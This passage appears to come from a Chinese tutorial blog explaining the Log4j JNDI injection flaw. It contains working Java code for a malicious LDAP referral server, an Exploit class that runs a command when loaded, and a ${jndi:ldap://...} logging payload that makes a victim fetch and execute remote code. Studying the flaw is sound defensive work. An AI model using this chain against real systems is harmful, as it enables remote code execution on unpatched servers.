domain&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            ds.add(&amp;quot;dn: &amp;quot; + &amp;quot;ou=employees,dc=example,dc=com&amp;quot;, &amp;quot;objectClass: organizationalUnit&amp;quot;, &amp;quot;objectClass: top&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            ds.add(&amp;quot;dn: &amp;quot; + &amp;quot;uid=wuya,ou=employees,dc=example,dc=com&amp;quot;, &amp;quot;objectClass: ExportObject&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            System.out.println(&amp;quot;Listening on 0.0.0.0:&amp;quot; + port); //$NON-NLS-1$&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            ds.startListening();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125; catch (Exception e) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            e.printStackTrace();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;client&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;public class JNDIClient &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    public static void main(String[] args) throws NamingException &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        Hashtable&amp;lt;String, Object&amp;gt; env = new Hashtable&amp;lt;String, Object&amp;gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        env.put(Context.INITIAL_CONTEXT_FACTORY, &amp;quot;com.sun.jndi.ldap.LdapCtxFactory&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        env.put(Context.PROVIDER_URL, &amp;quot;ldap://localhost:7389/dc=example,dc=com&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        //env.put(Context.SECURITY_AUTHENTICATION, &amp;quot;simple&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        //env.put(Context.SECURITY_PRINCIPAL, &amp;quot;cn=admin,dc=wuya,dc=net&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        //env.put(Context.SECURITY_CREDENTIALS, &amp;quot;wuya&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        DirContext ctx = new InitialDirContext(env);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        SearchControls searchControls = new SearchControls();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        searchControls.setSearchScope(SearchControls.SUBTREE_SCOPE);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        searchControls.setCountLimit(10);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        NamingEnumeration&amp;lt;SearchResult&amp;gt; namingEnumeration =&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                ctx.search(&amp;quot;&amp;quot;, &amp;quot;(uid=*)&amp;quot;, new Object[]&amp;#123;&amp;#125;, searchControls);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        //通过名称查找远程对象，假设远程服务器已经将一个远程对象与名称绑定了&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        ctx.lookup(&amp;quot;ldap://localhost:7389/ou=employees,dc=example,dc=com&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        while (namingEnumeration.hasMore()) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            SearchResult sr = namingEnumeration.next();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            System.out.println(&amp;quot;DN: &amp;quot; + sr.getName());&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            System.out.println(sr.getAttributes().get(&amp;quot;uid&amp;quot;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            //System.out.println(&amp;quot;Password:&amp;quot; + new String((byte[]) sr.getAttributes().get(&amp;quot;userPassword&amp;quot;).get()));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        ctx.close();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;JNDI 命名引用（Naming Reference）&lt;/p&gt;
&lt;p&gt;1、在 LDAP 里面可以存储一个外部的资源，叫做命名引用，对应 Reference 类比如远程 HTTP 服务的一个.class 文件&lt;/p&gt;
&lt;p&gt;2、如果 JNDI 客户端，在 LDAP 服务中找不到对应的资源 (test)，就去指定的地址请求。如果是命名引用，会把这个文件下载到本地&lt;/p&gt;
&lt;p&gt;3、如果下载的.class 文件包含无参构造函数或静态方法块，加载的时候会自动执行&lt;/p&gt;
&lt;p&gt;下面还有个例子，比如我们现在的 naming reference 是 Exploit，那么在 LDAP 服务中找不到对应的资源，会把刚刚的 class 下载到本地&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;public class LDAPRefServer &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    private static final String LDAP_BASE = &amp;quot;dc=example,dc=com&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    /**&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     * class地址 用#Exploit代替Exploit.class&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     */&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    private static final String EXPLOIT_CLASS_URL = &amp;quot;http://192.168.142.66:80/#Exploit&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    public static void main(String[] args) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        int port = 7912;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        try &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            config.setListenerConfigs(new InMemoryListenerConfig(&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &amp;quot;listen&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    InetAddress.getByName(&amp;quot;0.0.0.0&amp;quot;),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    port,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    ServerSocketFactory.getDefault(),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    SocketFactory.getDefault(),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    (SSLSocketFactory) SSLSocketFactory.getDefault()));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(EXPLOIT_CLASS_URL)));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            System.out.println(&amp;quot;Listening on 0.0.0.0:&amp;quot; + port);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            ds.startListening();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125; catch (Exception e) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            e.printStackTrace();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    private static class OperationInterceptor extends InMemoryOperationInterceptor &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        private URL codebase;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        public OperationInterceptor(URL cb) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            this.codebase = cb;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        @Override&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        public void processSearchResult(InMemoryInterceptedSearchResult result) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            String base = result.getRequest().getBaseDN();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            Entry e = new Entry(base);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            try &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                sendResult(result, base, e);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125; catch (Exception e1) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                e1.printStackTrace();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        protected void sendResult(InMemoryInterceptedSearchResult result, String base, Entry e) throws LDAPException, MalformedURLException &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            URL turl = new URL(this.codebase, this.codebase.getRef().replace(&amp;#x27;.&amp;#x27;, &amp;#x27;/&amp;#x27;).concat(&amp;quot;.class&amp;quot;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            System.out.println(&amp;quot;Send LDAP reference result for &amp;quot; + base + &amp;quot; redirecting to &amp;quot; + turl);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            e.addAttribute(&amp;quot;javaClassName&amp;quot;, &amp;quot;Calc&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            String cbstring = this.codebase.toString();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            int refPos = cbstring.indexOf(&amp;#x27;#&amp;#x27;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            if (refPos &amp;gt; 0) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                cbstring = cbstring.substring(0, refPos);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            e.addAttribute(&amp;quot;javaCodeBase&amp;quot;, cbstring);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            e.addAttribute(&amp;quot;objectClass&amp;quot;, &amp;quot;javaNamingReference&amp;quot;); //$NON-NLS-1$&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            e.addAttribute(&amp;quot;javaFactory&amp;quot;, this.codebase.getRef());&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            result.sendSearchEntry(e);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;import java.io.IOException;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;public class Exploit &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    public Exploit() &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    static &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        try &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            Runtime.getRuntime().exec(&amp;quot;calc&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125; catch (IOException var1) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            var1.printStackTrace();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;漏洞原理分析&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221126142622854.png&#34; alt=&#34;image-20221126142622854&#34;&gt;&lt;/p&gt;
&lt;p&gt;payload:&lt;/p&gt;
&lt;p&gt;logger.error(&amp;quot;${jndi:ldap://wuya.com:5678/test}&amp;quot;);&lt;/p&gt;
&lt;p&gt;1. 首先攻击者控制远程 http 服务器和 ldap 目录服务，http 服务器上存在恶意静态方法，LDAP 目录服务上？&lt;/p&gt;
&lt;p&gt;2. 攻击者通过一些方法传入我们的 payload&lt;/p&gt;
&lt;p&gt;由于 java 中 {} 可以解析变量&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;public class Main &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    private static  final  Logger logger = LogManager.getLogger();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    public static void main(String[] args) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        String content = &amp;quot;world&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        logger.trace(&amp;quot;hello &amp;#123;&amp;#125;&amp;quot;,content);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;public class Main &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    private static  final  Logger logger = LogManager.getLogger();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    public static void main(String[] args) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        String content = &amp;quot;world&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        logger.trace(&amp;quot;hello 